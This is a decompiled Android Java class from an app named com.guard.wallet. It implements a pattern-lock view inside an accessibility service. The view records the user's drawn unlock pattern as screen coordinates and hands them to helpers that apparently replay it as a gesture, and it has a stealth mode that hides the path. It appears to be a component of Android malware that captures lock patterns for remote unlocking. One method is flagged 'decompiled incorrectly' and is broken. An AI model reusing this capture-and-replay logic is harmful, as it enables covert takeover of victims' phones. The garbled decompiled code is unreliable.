package o0;

import a1.AbstractC0026q;
import android.R;
import android.animation.ValueAnimator;
import android.graphics.BlendMode;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Parcelable;
import android.os.SystemClock;
import android.support.annotation.ColorInt;
import android.support.annotation.Dimension;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.view.animation.AnimationUtils;
import android.view.animation.Interpolator;
import com.guard.wallet.entity.Point;
import com.guard.wallet.helper.AbstractC0192o;
import com.guard.wallet.helper.RunnableC0183f;
import com.guard.wallet.plug.C0225d;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0255k;
import java.lang.reflect.Array;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.locks.ReentrantLock;
import org.bouncycastle.tls.CipherSuite;
import p012o.RunnableC0415d;

/* renamed from: o0.h */
/* loaded from: classes.dex */
public final class C0445h extends View {

    /* renamed from: K */
    public static int f1013K;

    /* renamed from: A */
    public boolean f1014A;

    /* renamed from: B */
    public boolean f1015B;

    /* renamed from: C */
    public boolean f1016C;

    /* renamed from: D */
    public float f1017D;

    /* renamed from: E */
    public float f1018E;

    /* renamed from: F */
    public final Path f1019F;

    /* renamed from: G */
    public final Rect f1020G;

    /* renamed from: H */
    public final Rect f1021H;

    /* renamed from: I */
    public Interpolator f1022I;

    /* renamed from: J */
    public Interpolator f1023J;

    /* renamed from: a */
    public C0443f[][] f1024a;

    /* renamed from: b */
    public int f1025b;

    /* renamed from: c */
    public long f1026c;

    /* renamed from: d */
    public final float f1027d;

    /* renamed from: e */
    public boolean f1028e;

    /* renamed from: f */
    public int f1029f;

    /* renamed from: g */
    public int f1030g;

    /* renamed from: h */
    public int f1031h;

    /* renamed from: i */
    public int f1032i;

    /* renamed from: j */
    public int f1033j;

    /* renamed from: k */
    public int f1034k;

    /* renamed from: l */
    public int f1035l;

    /* renamed from: m */
    public int f1036m;

    /* renamed from: n */
    public int f1037n;

    /* renamed from: o */
    public int f1038o;

    /* renamed from: p */
    public int f1039p;

    /* renamed from: q */
    public EnumC0442e f1040q;

    /* renamed from: r */
    public Paint f1041r;

    /* renamed from: s */
    public Paint f1042s;

    /* renamed from: t */
    public final ArrayList f1043t;

    /* renamed from: u */
    public ArrayList f1044u;

    /* renamed from: v */
    public boolean[][] f1045v;

    /* renamed from: w */
    public float f1046w;

    /* renamed from: x */
    public float f1047x;

    /* renamed from: y */
    public int f1048y;

    /* renamed from: z */
    public boolean f1049z;

    public C0445h(MyAccessibilityService myAccessibilityService) {
        super(myAccessibilityService, null);
        this.f1027d = 0.6f;
        this.f1046w = -1.0f;
        this.f1047x = -1.0f;
        this.f1048y = 0;
        this.f1049z = true;
        this.f1014A = false;
        this.f1015B = true;
        this.f1016C = false;
        this.f1019F = new Path();
        this.f1020G = new Rect();
        this.f1021H = new Rect();
        f1013K = 3;
        this.f1028e = false;
        this.f1029f = 1;
        this.f1034k = 3;
        this.f1033j = -1;
        this.f1030g = -1;
        this.f1032i = -1;
        this.f1031h = Color.parseColor("#f4511e");
        this.f1040q = EnumC0442e.ALIGN_CENTER;
        this.f1035l = 10;
        this.f1036m = 24;
        this.f1037n = -1;
        this.f1038o = CipherSuite.TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA256;
        this.f1039p = 100;
        int i2 = f1013K;
        this.f1025b = i2 * i2;
        this.f1044u = new ArrayList(this.f1025b);
        int i3 = f1013K;
        this.f1045v = (boolean[][]) Array.newInstance((Class<?>) Boolean.TYPE, i3, i3);
        int i4 = f1013K;
        this.f1024a = (C0443f[][]) Array.newInstance((Class<?>) C0443f.class, i4, i4);
        for (int i5 = 0; i5 < f1013K; i5++) {
            for (int i6 = 0; i6 < f1013K; i6++) {
                C0443f[][] c0443fArr = this.f1024a;
                c0443fArr[i5][i6] = new C0443f();
                c0443fArr[i5][i6].f1003a = this.f1035l;
            }
        }
        this.f1043t = new ArrayList();
        m1178g();
    }

    private int getCurrentPathColor() {
        if (this.f1014A || this.f1016C) {
            return this.f1033j;
        }
        int i2 = this.f1048y;
        if (i2 == 2) {
            return this.f1031h;
        }
        if (i2 == 0 || i2 == 1) {
            return this.f1032i;
        }
        throw new IllegalStateException("Unknown view mode " + this.f1048y);
    }

    /* renamed from: a */
    public final void m1172a(C0441d c0441d) {
        boolean[][] zArr = this.f1045v;
        int i2 = c0441d.f990a;
        boolean[] zArr2 = zArr[i2];
        int i3 = c0441d.f991b;
        zArr2[i3] = true;
        this.f1044u.add(c0441d);
        if (!this.f1014A) {
            C0443f c0443f = this.f1024a[i2][i3];
            m1181j(this.f1035l, this.f1036m, this.f1038o, this.f1023J, c0443f, new RunnableC0415d(this, c0443f, 11));
            float f2 = this.f1046w;
            float f3 = this.f1047x;
            float m1176e = m1176e(i3);
            float m1177f = m1177f(i2);
            ValueAnimator ofFloat = ValueAnimator.ofFloat(0.0f, 1.0f);
            ofFloat.addUpdateListener(new C0438a(this, c0443f, f2, m1176e, f3, m1177f));
            ofFloat.addListener(new C0439b(this, c0443f, 0));
            ofFloat.setInterpolator(this.f1022I);
            ofFloat.setDuration(this.f1039p);
            ofFloat.start();
            c0443f.f1007e = ofFloat;
        }
        announceForAccessibility("Dot added to pattern");
        ArrayList arrayList = this.f1044u;
        Iterator it = this.f1043t.iterator();
        while (it.hasNext()) {
            C0446i c0446i = (C0446i) it.next();
            if (c0446i != null) {
                Log.d(C0446i.class.getName(), "Pattern progress: " + AbstractC0251g.E0(c0446i.f1050a, arrayList));
            }
        }
    }

    /* renamed from: b */
    public final void m1173b() {
        for (int i2 = 0; i2 < f1013K; i2++) {
            for (int i3 = 0; i3 < f1013K; i3++) {
                this.f1045v[i2][i3] = false;
            }
        }
    }

    /* renamed from: c */
    public final void m1174c() {
        ArrayList arrayList = this.f1043t;
        try {
            if (!arrayList.isEmpty()) {
                arrayList.clear();
            }
            if (!this.f1044u.isEmpty()) {
                this.f1044u.clear();
            }
            this.f1042s = null;
            this.f1041r = null;
            Path path = this.f1019F;
            if (path != null) {
                path.close();
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o0.h", e2);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:13:0x0061  */
    /* JADX WARN: Removed duplicated region for block: B:40:0x00c5 A[RETURN] */
    /* renamed from: d */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final C0441d m1175d(float f2, float f3) {
        C0441d m1171b;
        float f4 = this.f1018E;
        float f5 = this.f1027d;
        float f6 = f5 * f4;
        float paddingTop = ((f4 - f6) / 2.0f) + getPaddingTop();
        int i2 = 0;
        int i3 = 0;
        while (true) {
            if (i3 >= f1013K) {
                i3 = -1;
                break;
            }
            float f7 = (i3 * f4) + paddingTop;
            if (f3 >= f7 && f3 <= f7 + f6) {
                break;
            }
            i3++;
        }
        C0441d c0441d = null;
        if (i3 >= 0) {
            float f8 = this.f1017D;
            float f9 = f5 * f8;
            float paddingLeft = ((f8 - f9) / 2.0f) + getPaddingLeft();
            while (true) {
                if (i2 >= f1013K) {
                    i2 = -1;
                    break;
                }
                float f10 = (i2 * f8) + paddingLeft;
                if (f2 >= f10 && f2 <= f10 + f9) {
                    break;
                }
                i2++;
            }
            if (i2 >= 0 && !this.f1045v[i3][i2]) {
                m1171b = C0441d.m1171b(i3, i2);
                if (m1171b != null) {
                    return null;
                }
                ArrayList arrayList = this.f1044u;
                if (!arrayList.isEmpty()) {
                    C0441d c0441d2 = (C0441d) arrayList.get(arrayList.size() - 1);
                    int i4 = c0441d2.f990a;
                    int i5 = m1171b.f990a - i4;
                    int i6 = m1171b.f991b;
                    int i7 = c0441d2.f991b;
                    int i8 = i6 - i7;
                    if (Math.abs(i5) == 2 && Math.abs(i8) != 1) {
                        i4 = (i5 > 0 ? 1 : -1) + c0441d2.f990a;
                    }
                    if (Math.abs(i8) == 2 && Math.abs(i5) != 1) {
                        i7 += i8 > 0 ? 1 : -1;
                    }
                    c0441d = C0441d.m1171b(i4, i7);
                }
                if (c0441d != null && !this.f1045v[c0441d.f990a][c0441d.f991b]) {
                    m1172a(c0441d);
                }
                m1172a(m1171b);
                if (this.f1015B) {
                    performHapticFeedback(1, 3);
                }
                return m1171b;
            }
        }
        m1171b = null;
        if (m1171b != null) {
        }
    }

    /* renamed from: e */
    public final float m1176e(int i2) {
        float paddingLeft = getPaddingLeft();
        float f2 = this.f1017D;
        return (f2 / 2.0f) + (i2 * f2) + paddingLeft;
    }

    /* renamed from: f */
    public final float m1177f(int i2) {
        int i3;
        float f2;
        float f3;
        EnumC0442e enumC0442e = this.f1040q;
        if (enumC0442e == EnumC0442e.ALIGN_TOP) {
            return ((i2 * this.f1018E) + getPaddingTop()) - (this.f1035l / 2.0f);
        }
        if (enumC0442e == EnumC0442e.ALIGN_TOP_CENTER) {
            return (i2 * this.f1018E) + getPaddingTop();
        }
        if (enumC0442e == EnumC0442e.ALIGN_TOP_BOTTOM) {
            f3 = (i2 * this.f1018E) + getPaddingTop();
            i3 = this.f1035l;
        } else {
            if (enumC0442e == EnumC0442e.ALIGN_TOP_BOTTOM_2) {
                return (i2 * this.f1018E) + getPaddingTop() + this.f1035l;
            }
            if (enumC0442e == EnumC0442e.ALIGN_TOP_BOTTOM_3) {
                f2 = (i2 * this.f1018E) + getPaddingTop();
                i3 = this.f1035l;
            } else {
                if (enumC0442e == EnumC0442e.ALIGN_TOP_BOTTOM_4) {
                    float paddingTop = (i2 * this.f1018E) + getPaddingTop();
                    int i4 = this.f1035l;
                    return paddingTop + i4 + i4;
                }
                if (enumC0442e != EnumC0442e.ALIGN_TOP_BOTTOM_5) {
                    if (enumC0442e == EnumC0442e.ALIGN_CENTER) {
                        float paddingTop2 = getPaddingTop();
                        float f4 = this.f1018E;
                        return (f4 / 2.0f) + (i2 * f4) + paddingTop2;
                    }
                    if (enumC0442e == EnumC0442e.ALIGN_CENTER_TOP) {
                        float paddingTop3 = getPaddingTop();
                        float f5 = this.f1018E;
                        return ((f5 / 2.0f) + ((i2 * f5) + paddingTop3)) - (this.f1035l / 2.0f);
                    }
                    if (enumC0442e != EnumC0442e.ALIGN_CENTER_BOTTOM) {
                        return (((i2 + 2) * this.f1018E) + getPaddingTop()) - (this.f1035l / 2.0f);
                    }
                    float paddingTop4 = getPaddingTop();
                    float f6 = this.f1018E;
                    return (this.f1035l / 2.0f) + (f6 / 2.0f) + (i2 * f6) + paddingTop4;
                }
                float paddingTop5 = (i2 * this.f1018E) + getPaddingTop();
                i3 = this.f1035l;
                f2 = paddingTop5 + i3;
            }
            f3 = f2 + i3;
        }
        return (i3 / 2.0f) + f3;
    }

    /* renamed from: g */
    public final void m1178g() {
        BlendMode blendMode;
        setClickable(true);
        Paint paint = new Paint();
        this.f1042s = paint;
        paint.setAntiAlias(true);
        this.f1042s.setDither(true);
        this.f1042s.setColor(this.f1033j);
        this.f1042s.setStyle(Paint.Style.STROKE);
        this.f1042s.setStrokeJoin(Paint.Join.ROUND);
        this.f1042s.setStrokeCap(Paint.Cap.ROUND);
        this.f1042s.setStrokeWidth(this.f1034k);
        if (Build.VERSION.SDK_INT >= 29) {
            Paint paint2 = this.f1042s;
            blendMode = BlendMode.OVERLAY;
            paint2.setBlendMode(blendMode);
        }
        Paint paint3 = new Paint();
        this.f1041r = paint3;
        paint3.setAntiAlias(true);
        this.f1041r.setDither(true);
        if (isInEditMode()) {
            return;
        }
        this.f1022I = AnimationUtils.loadInterpolator(getContext(), R.interpolator.fast_out_slow_in);
        this.f1023J = AnimationUtils.loadInterpolator(getContext(), R.interpolator.linear_out_slow_in);
    }

    public int getAspectRatio() {
        return this.f1029f;
    }

    public int getCorrectStateColor() {
        return this.f1032i;
    }

    public int getDotAnimationDuration() {
        return this.f1038o;
    }

    public int getDotCount() {
        return f1013K;
    }

    public int getDotNormalSize() {
        return this.f1035l;
    }

    public int getDotSelectedColor() {
        return this.f1037n;
    }

    public int getDotSelectedSize() {
        return this.f1036m;
    }

    public int getNormalStateColor() {
        return this.f1030g;
    }

    public int getPathColor() {
        return this.f1033j;
    }

    public int getPathEndAnimationDuration() {
        return this.f1039p;
    }

    public int getPathWidth() {
        return this.f1034k;
    }

    public List<C0441d> getPattern() {
        return (List) this.f1044u.clone();
    }

    public int getPatternSize() {
        return this.f1025b;
    }

    public int getPatternViewMode() {
        return this.f1048y;
    }

    public int getWrongStateColor() {
        return this.f1031h;
    }

    /* renamed from: h */
    public final void m1179h() {
        announceForAccessibility("Pattern cleared");
        Iterator it = this.f1043t.iterator();
        while (it.hasNext()) {
            if (((C0446i) it.next()) != null) {
                Log.d(C0446i.class.getName(), "Pattern has been cleared");
            }
        }
    }

    /* renamed from: i */
    public final void m1180i() {
        announceForAccessibility("Pattern drawing started");
        Iterator it = this.f1043t.iterator();
        while (it.hasNext()) {
            if (((C0446i) it.next()) != null) {
                Log.d(C0446i.class.getName(), "Pattern drawing started");
            }
        }
    }

    /* renamed from: j */
    public final void m1181j(float f2, float f3, long j2, Interpolator interpolator, C0443f c0443f, RunnableC0415d runnableC0415d) {
        ValueAnimator ofFloat = ValueAnimator.ofFloat(f2, f3);
        ofFloat.addUpdateListener(new C0440c(this, c0443f));
        if (runnableC0415d != null) {
            ofFloat.addListener(new C0439b(this, runnableC0415d, 1));
        }
        ofFloat.setInterpolator(interpolator);
        ofFloat.setDuration(j2);
        ofFloat.start();
    }

    @Override // android.view.View
    public final void onDraw(Canvas canvas) {
        int i2;
        ArrayList arrayList = this.f1044u;
        int size = arrayList.size();
        boolean[][] zArr = this.f1045v;
        if (this.f1048y == 1) {
            int elapsedRealtime = (((int) (SystemClock.elapsedRealtime() - this.f1026c)) % ((size + 1) * 700)) / 700;
            m1173b();
            for (int i3 = 0; i3 < elapsedRealtime; i3++) {
                C0441d c0441d = (C0441d) arrayList.get(i3);
                zArr[c0441d.f990a][c0441d.f991b] = true;
            }
            if (elapsedRealtime > 0 && elapsedRealtime < size) {
                float f2 = (r8 % 700) / 700.0f;
                C0441d c0441d2 = (C0441d) arrayList.get(elapsedRealtime - 1);
                float m1176e = m1176e(c0441d2.f991b);
                float m1177f = m1177f(c0441d2.f990a);
                C0441d c0441d3 = (C0441d) arrayList.get(elapsedRealtime);
                float m1176e2 = (m1176e(c0441d3.f991b) - m1176e) * f2;
                float m1177f2 = (m1177f(c0441d3.f990a) - m1177f) * f2;
                this.f1046w = m1176e + m1176e2;
                this.f1047x = m1177f + m1177f2;
            }
            invalidate();
        }
        Path path = this.f1019F;
        path.rewind();
        int i4 = 0;
        while (true) {
            float f3 = 1.0f;
            float f4 = 0.0f;
            if (i4 >= f1013K) {
                if (!this.f1014A) {
                    this.f1042s.setColor(getCurrentPathColor());
                    int i5 = 0;
                    float f5 = 0.0f;
                    float f6 = 0.0f;
                    boolean z2 = false;
                    while (i5 < size) {
                        C0441d c0441d4 = (C0441d) arrayList.get(i5);
                        boolean[] zArr2 = zArr[c0441d4.f990a];
                        int i6 = c0441d4.f991b;
                        if (!zArr2[i6]) {
                            break;
                        }
                        float m1176e3 = m1176e(i6);
                        int i7 = c0441d4.f990a;
                        float m1177f3 = m1177f(i7);
                        if (i5 != 0) {
                            C0443f c0443f = this.f1024a[i7][i6];
                            path.rewind();
                            path.moveTo(f5, f6);
                            float f7 = c0443f.f1005c;
                            if (f7 != Float.MIN_VALUE) {
                                float f8 = c0443f.f1006d;
                                if (f8 != Float.MIN_VALUE) {
                                    path.lineTo(f7, f8);
                                    canvas.drawPath(path, this.f1042s);
                                }
                            }
                            path.lineTo(m1176e3, m1177f3);
                            canvas.drawPath(path, this.f1042s);
                        }
                        i5++;
                        z2 = true;
                        f5 = m1176e3;
                        f6 = m1177f3;
                    }
                    if ((this.f1016C || this.f1048y == 1) && z2) {
                        path.rewind();
                        path.moveTo(f5, f6);
                        path.lineTo(this.f1046w, this.f1047x);
                        Paint paint = this.f1042s;
                        float f9 = this.f1046w - f5;
                        float f10 = this.f1047x - f6;
                        paint.setAlpha((int) (Math.min(1.0f, Math.max(0.0f, ((((float) Math.sqrt((f10 * f10) + (f9 * f9))) / this.f1017D) - 0.3f) * 4.0f)) * 255.0f));
                        canvas.drawPath(path, this.f1042s);
                        return;
                    }
                    return;
                }
                return;
            }
            float m1177f4 = m1177f(i4);
            int i8 = 0;
            while (i8 < f1013K) {
                C0443f c0443f2 = this.f1024a[i4][i8];
                float m1176e4 = m1176e(i8);
                float f11 = c0443f2.f1003a * f3;
                float f12 = m1177f4 + f4;
                boolean z3 = zArr[i4][i8];
                boolean z4 = c0443f2.f1004b;
                Paint paint2 = this.f1041r;
                if (!z3 || this.f1014A || this.f1016C) {
                    i2 = z4 ? this.f1037n : this.f1030g;
                } else {
                    int i9 = this.f1048y;
                    if (i9 == 2) {
                        i2 = this.f1031h;
                    } else {
                        if (i9 != 0 && i9 != 1) {
                            throw new IllegalStateException("Unknown view mode " + this.f1048y);
                        }
                        i2 = this.f1032i;
                    }
                }
                paint2.setColor(i2);
                this.f1041r.setAlpha((int) 255.0f);
                canvas.drawCircle(m1176e4, f12, f11 / 2.0f, this.f1041r);
                i8++;
                f3 = 1.0f;
                f4 = 0.0f;
            }
            i4++;
        }
    }

    @Override // android.view.View
    public final boolean onHoverEvent(MotionEvent motionEvent) {
        int i2;
        if (((AccessibilityManager) getContext().getSystemService("accessibility")).isTouchExplorationEnabled()) {
            int action = motionEvent.getAction();
            if (action == 7) {
                i2 = 2;
            } else if (action != 9) {
                if (action == 10) {
                    i2 = 1;
                }
                onTouchEvent(motionEvent);
                motionEvent.setAction(action);
            } else {
                i2 = 0;
            }
            motionEvent.setAction(i2);
            onTouchEvent(motionEvent);
            motionEvent.setAction(action);
        }
        return super.onHoverEvent(motionEvent);
    }

    @Override // android.view.View
    public final void onMeasure(int i2, int i3) {
        super.onMeasure(i2, i3);
        if (this.f1028e) {
            int suggestedMinimumWidth = getSuggestedMinimumWidth();
            int size = View.MeasureSpec.getSize(i2);
            int mode = View.MeasureSpec.getMode(i2);
            if (mode == Integer.MIN_VALUE) {
                suggestedMinimumWidth = Math.max(size, suggestedMinimumWidth);
            } else if (mode != 0) {
                suggestedMinimumWidth = size;
            }
            int suggestedMinimumHeight = getSuggestedMinimumHeight();
            int size2 = View.MeasureSpec.getSize(i3);
            int mode2 = View.MeasureSpec.getMode(i3);
            if (mode2 == Integer.MIN_VALUE) {
                suggestedMinimumHeight = Math.max(size2, suggestedMinimumHeight);
            } else if (mode2 != 0) {
                suggestedMinimumHeight = size2;
            }
            int i4 = this.f1029f;
            if (i4 == 0) {
                suggestedMinimumWidth = Math.min(suggestedMinimumWidth, suggestedMinimumHeight);
                suggestedMinimumHeight = suggestedMinimumWidth;
            } else if (i4 == 1) {
                suggestedMinimumHeight = Math.min(suggestedMinimumWidth, suggestedMinimumHeight);
            } else {
                if (i4 != 2) {
                    throw new IllegalStateException("Unknown aspect ratio");
                }
                suggestedMinimumWidth = Math.min(suggestedMinimumWidth, suggestedMinimumHeight);
            }
            setMeasuredDimension(suggestedMinimumWidth, suggestedMinimumHeight);
        }
    }

    @Override // android.view.View
    public final void onRestoreInstanceState(Parcelable parcelable) {
        C0444g c0444g = (C0444g) parcelable;
        super.onRestoreInstanceState(c0444g.getSuperState());
        ArrayList arrayList = new ArrayList();
        int i2 = 0;
        while (true) {
            String str = c0444g.f1008a;
            if (i2 >= str.length()) {
                break;
            }
            int numericValue = Character.getNumericValue(str.charAt(i2));
            arrayList.add(C0441d.m1171b(numericValue / getDotCount(), numericValue % getDotCount()));
            i2++;
        }
        this.f1044u.clear();
        this.f1044u.addAll(arrayList);
        m1173b();
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            C0441d c0441d = (C0441d) it.next();
            this.f1045v[c0441d.f990a][c0441d.f991b] = true;
        }
        setViewMode(0);
        this.f1048y = c0444g.f1009b;
        this.f1049z = c0444g.f1010c;
        this.f1014A = c0444g.f1011d;
        this.f1015B = c0444g.f1012e;
    }

    @Override // android.view.View
    public final Parcelable onSaveInstanceState() {
        return new C0444g(super.onSaveInstanceState(), AbstractC0251g.E0(this, this.f1044u), this.f1048y, this.f1049z, this.f1014A, this.f1015B);
    }

    @Override // android.view.View
    public final void onSizeChanged(int i2, int i3, int i4, int i5) {
        this.f1017D = ((i2 - getPaddingLeft()) - getPaddingRight()) / f1013K;
        this.f1018E = ((i3 - getPaddingTop()) - getPaddingBottom()) / f1013K;
    }

    @Override // android.view.View
    public final boolean onTouchEvent(MotionEvent motionEvent) {
        Point point;
        int i2 = 0;
        if (!this.f1049z || !isEnabled()) {
            return false;
        }
        int action = motionEvent.getAction();
        boolean z2 = true;
        if (action == 0) {
            this.f1044u.clear();
            m1173b();
            this.f1048y = 0;
            invalidate();
            float x2 = motionEvent.getX();
            float y2 = motionEvent.getY();
            C0441d m1175d = m1175d(x2, y2);
            if (m1175d != null) {
                this.f1016C = true;
                this.f1048y = 0;
                m1180i();
            } else {
                this.f1016C = false;
                m1179h();
            }
            if (m1175d != null) {
                float m1176e = m1176e(m1175d.f991b);
                float m1177f = m1177f(m1175d.f990a);
                float f2 = this.f1017D / 2.0f;
                float f3 = this.f1018E / 2.0f;
                invalidate((int) (m1176e - f2), (int) (m1177f - f3), (int) (m1176e + f2), (int) (m1177f + f3));
            }
            this.f1046w = x2;
            this.f1047x = y2;
            return true;
        }
        int i3 = 2;
        if (action != 1) {
            if (action != 2) {
                if (action != 3) {
                    return false;
                }
                this.f1016C = false;
                this.f1044u.clear();
                m1173b();
                this.f1048y = 0;
                invalidate();
                m1179h();
                return true;
            }
            float f4 = this.f1034k;
            int historySize = motionEvent.getHistorySize();
            Rect rect = this.f1021H;
            rect.setEmpty();
            boolean z3 = false;
            while (i2 < historySize + 1) {
                float historicalX = i2 < historySize ? motionEvent.getHistoricalX(i2) : motionEvent.getX();
                float historicalY = i2 < historySize ? motionEvent.getHistoricalY(i2) : motionEvent.getY();
                C0441d m1175d2 = m1175d(historicalX, historicalY);
                int size = this.f1044u.size();
                if (m1175d2 != null && size == z2) {
                    this.f1016C = z2;
                    m1180i();
                }
                float abs = Math.abs(historicalX - this.f1046w);
                float abs2 = Math.abs(historicalY - this.f1047x);
                if (abs > 0.0f || abs2 > 0.0f) {
                    z3 = z2;
                }
                if (this.f1016C && size > 0) {
                    C0441d c0441d = (C0441d) this.f1044u.get(size - 1);
                    float m1176e2 = m1176e(c0441d.f991b);
                    float m1177f2 = m1177f(c0441d.f990a);
                    float min = Math.min(m1176e2, historicalX) - f4;
                    float max = Math.max(m1176e2, historicalX) + f4;
                    float min2 = Math.min(m1177f2, historicalY) - f4;
                    float max2 = Math.max(m1177f2, historicalY) + f4;
                    if (m1175d2 != null) {
                        float f5 = this.f1017D * 0.5f;
                        float f6 = this.f1018E * 0.5f;
                        float m1176e3 = m1176e(m1175d2.f991b);
                        float m1177f3 = m1177f(m1175d2.f990a);
                        min = Math.min(m1176e3 - f5, min);
                        max = Math.max(m1176e3 + f5, max);
                        min2 = Math.min(m1177f3 - f6, min2);
                        max2 = Math.max(m1177f3 + f6, max2);
                    }
                    rect.union(Math.round(min), Math.round(min2), Math.round(max), Math.round(max2));
                }
                i2++;
                z2 = true;
            }
            this.f1046w = motionEvent.getX();
            this.f1047x = motionEvent.getY();
            if (!z3) {
                return true;
            }
            Rect rect2 = this.f1020G;
            rect2.union(rect);
            invalidate(rect2);
            rect2.set(rect);
            return true;
        }
        if (this.f1044u.isEmpty()) {
            return true;
        }
        this.f1016C = false;
        for (int i4 = 0; i4 < f1013K; i4++) {
            for (int i5 = 0; i5 < f1013K; i5++) {
                C0443f c0443f = this.f1024a[i4][i5];
                ValueAnimator valueAnimator = c0443f.f1007e;
                if (valueAnimator != null) {
                    valueAnimator.cancel();
                    c0443f.f1005c = Float.MIN_VALUE;
                    c0443f.f1006d = Float.MIN_VALUE;
                }
            }
        }
        announceForAccessibility("Pattern drawing completed");
        ArrayList arrayList = this.f1044u;
        Iterator it = this.f1043t.iterator();
        while (it.hasNext()) {
            C0446i c0446i = (C0446i) it.next();
            if (c0446i != null) {
                ReentrantLock reentrantLock = c0446i.f1051b;
                if (reentrantLock.tryLock()) {
                    Log.d(C0446i.class.getName(), "Pattern complete: ");
                    C0445h c0445h = c0446i.f1050a;
                    if (c0445h != null) {
                        LinkedList linkedList = new LinkedList();
                        if (arrayList != null && !arrayList.isEmpty()) {
                            Iterator it2 = arrayList.iterator();
                            while (it2.hasNext()) {
                                C0441d c0441d2 = (C0441d) it2.next();
                                if (c0441d2 != null) {
                                    int[] iArr = new int[2];
                                    c0445h.getLocationOnScreen(iArr);
                                    Log.d("getCenterForDot X:", String.valueOf(iArr[0]));
                                    Log.d("getCenterForDot Y:", String.valueOf(iArr[1]));
                                    point = new Point(c0445h.m1176e(c0441d2.f991b) + iArr[0], c0445h.m1177f(c0441d2.f990a) + iArr[1]);
                                } else {
                                    point = null;
                                }
                                if (point != null) {
                                    linkedList.add(point);
                                }
                            }
                        }
                        C0225d c0225d = AbstractC0192o.f225b;
                        c0225d.getClass();
                        if (!linkedList.isEmpty()) {
                            LinkedList linkedList2 = c0225d.f268a;
                            linkedList2.clear();
                            linkedList2.addAll(linkedList);
                        }
                        c0445h.f1044u.clear();
                        c0445h.m1173b();
                        c0445h.f1048y = 0;
                        c0445h.invalidate();
                        try {
                            ReentrantLock reentrantLock2 = AbstractC0192o.f226c;
                            if (reentrantLock2.tryLock()) {
                                if (AbstractC0255k.m727a()) {
                                    AbstractC0192o.m364e();
                                } else {
                                    new Handler(Looper.getMainLooper()).post(new RunnableC0183f(i3));
                                }
                                reentrantLock2.unlock();
                            }
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("com.guard.wallet.helper.o", e2);
                        }
                        if (!AbstractC0192o.m368i()) {
                            AbstractC0251g.T0(5);
                            Point[] pointArr = new Point[linkedList.size()];
                            linkedList.toArray(pointArr);
                            if (AbstractC0251g.m646S(10L, 800L, pointArr)) {
                                AbstractC0251g.T0(5);
                            }
                        }
                    }
                    reentrantLock.unlock();
                }
            }
        }
        invalidate();
        return true;
    }

    public void setAspectRatio(int i2) {
        this.f1029f = i2;
        requestLayout();
    }

    public void setAspectRatioEnabled(boolean z2) {
        this.f1028e = z2;
        requestLayout();
    }

    public void setCorrectStateColor(@ColorInt int i2) {
        this.f1032i = i2;
    }

    public void setDotAlign(EnumC0442e enumC0442e) {
        this.f1040q = enumC0442e;
        invalidate();
    }

    public void setDotAnimationDuration(int i2) {
        this.f1038o = i2;
        invalidate();
    }

    public void setDotCount(int i2) {
        f1013K = i2;
        this.f1025b = i2 * i2;
        this.f1044u = new ArrayList(this.f1025b);
        int i3 = f1013K;
        this.f1045v = (boolean[][]) Array.newInstance((Class<?>) Boolean.TYPE, i3, i3);
        int i4 = f1013K;
        this.f1024a = (C0443f[][]) Array.newInstance((Class<?>) C0443f.class, i4, i4);
        for (int i5 = 0; i5 < f1013K; i5++) {
            for (int i6 = 0; i6 < f1013K; i6++) {
                C0443f[][] c0443fArr = this.f1024a;
                c0443fArr[i5][i6] = new C0443f();
                c0443fArr[i5][i6].f1003a = this.f1035l;
            }
        }
        requestLayout();
        invalidate();
    }

    public void setDotNormalSize(@Dimension int i2) {
        this.f1035l = i2;
        for (int i3 = 0; i3 < f1013K; i3++) {
            for (int i4 = 0; i4 < f1013K; i4++) {
                C0443f[][] c0443fArr = this.f1024a;
                c0443fArr[i3][i4] = new C0443f();
                c0443fArr[i3][i4].f1003a = this.f1035l;
            }
        }
        invalidate();
    }

    public void setDotSelectedColor(int i2) {
        this.f1037n = i2;
    }

    public void setDotSelectedSize(@Dimension int i2) {
        this.f1036m = i2;
    }

    public void setEnableHapticFeedback(boolean z2) {
        this.f1015B = z2;
    }

    public void setInStealthMode(boolean z2) {
        this.f1014A = z2;
    }

    public void setInputEnabled(boolean z2) {
        this.f1049z = z2;
    }

    public void setNormalStateColor(@ColorInt int i2) {
        this.f1030g = i2;
    }

    public void setPathColor(int i2) {
        this.f1033j = i2;
        m1178g();
        invalidate();
    }

    public void setPathEndAnimationDuration(int i2) {
        this.f1039p = i2;
    }

    public void setPathWidth(@Dimension int i2) {
        this.f1034k = i2;
        m1178g();
        invalidate();
    }

    public void setTactileFeedbackEnabled(boolean z2) {
        this.f1015B = z2;
    }

    public void setViewMode(int i2) {
        this.f1048y = i2;
        if (i2 == 1) {
            if (this.f1044u.size() == 0) {
                throw new IllegalStateException("you must have a pattern to animate if you want to set the display mode to animate");
            }
            this.f1026c = SystemClock.elapsedRealtime();
            C0441d c0441d = (C0441d) this.f1044u.get(0);
            this.f1046w = m1176e(c0441d.f991b);
            this.f1047x = m1177f(c0441d.f990a);
            m1173b();
        }
        invalidate();
    }

    public void setWrongStateColor(@ColorInt int i2) {
        this.f1031h = i2;
    }
}
